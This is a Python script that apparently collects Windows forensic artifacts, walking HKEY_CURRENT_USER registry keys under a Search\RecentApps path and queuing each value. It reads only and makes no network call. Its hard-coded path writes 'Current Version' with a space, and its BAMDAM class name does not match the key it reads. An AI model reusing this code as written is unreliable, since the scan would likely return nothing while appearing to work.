import threading
import itertools
import os
from contextlib import suppress
import winreg
import queue
from datetime import datetime
import struct


def convert_windate(windate):
    date_format = '%Y/%m/%d %H:%M:%S UTC'
    # 10000000 - 100 nanosecond intervals in windows timestamp, remove them to get to seconds since windows epoch
    no_nano = windate / 10000000
    unix = no_nano - 11644473600  # number of seconds between 1/1/1601 and 1/1/1970
    return datetime.fromtimestamp(int(unix)).strftime(date_format)


class BaseRegitryValue():
    def __init__(self, **kwargs):
        self.path = None
        self.key = None
        self.value = None
        self.type = None
        for k, v in kwargs.items():
            setattr(self, k, v)


class BaseSideScaner(threading.Thread):
    def __init__(self, payload_queue):
        threading.Thread.__init__(self)
        self.payload_queue = payload_queue
        self.base_hkey = winreg.HKEY_CURRENT_USER
        self.base_path = ""
        self.paths_list = []
        self.fully_data = []
        self.data_struct = None

    def recursive_paths(self, path=None):
        with suppress(WindowsError), winreg.OpenKey(self.base_hkey, path, 0, winreg.KEY_READ | 0) as key:
            for i in itertools.count():
                new_key = winreg.EnumKey(key, i)
                new_path = os.path.join(path, new_key)
                self.paths_list.append(new_path)
                self.recursive_paths(new_path)

    def get_values(self, path):
        with suppress(WindowsError), winreg.OpenKey(self.base_hkey, path, 0, winreg.KEY_READ | 0) as key:
            for i in itertools.count():
                yield winreg.EnumValue(key, i)

    def collect_data(self):
        if self.paths_list == []:
            for value in self.get_values(self.base_path):
                curent_branch = {'path': self.base_path, 'key': value[0], 'value': value[1], 'type': value[2]}
                self.fully_data.append(self.data_struct(**curent_branch))
        else:
            for path in self.paths_list:
                for value in self.get_values(path):
                    curent_branch = {'path': path, 'key': value[0], 'value': value[1], 'type': value[2]}
                    self.fully_data.append(self.data_struct(**curent_branch))

    def run(self):
        self.recursive_paths(self.base_path)
        self.collect_data()
        print(self.paths_list)
        for dat in self.fully_data:
            payload = {'module_name': self.__class__.__name__, 'key': dat.key, 'value': dat.value, 'type': dat.type,
                       'path': dat.path,
                       }
            # print(dat.value)
            self.payload_queue.put(payload)


class BAMDAMValue(BaseRegitryValue):
    def __init__(self, **kwargs):
        BaseRegitryValue.__init__(self, **kwargs)


class BAMDAM(BaseSideScaner):
    def __init__(self, payload_queue):
        BaseSideScaner.__init__(self, payload_queue)
        self.base_hkey = winreg.HKEY_CURRENT_USER
        self.base_path = 'SOFTWARE\\Microsoft\\Windows\\Current Version\\Search\\RecentApps'
        self.data_struct = BAMDAMValue


if __name__ == '__main__':
    payload_queue = queue.Queue()
    worker = BAMDAM(payload_queue)
    worker.setDaemon(True)
    worker.start()
    worker.join()
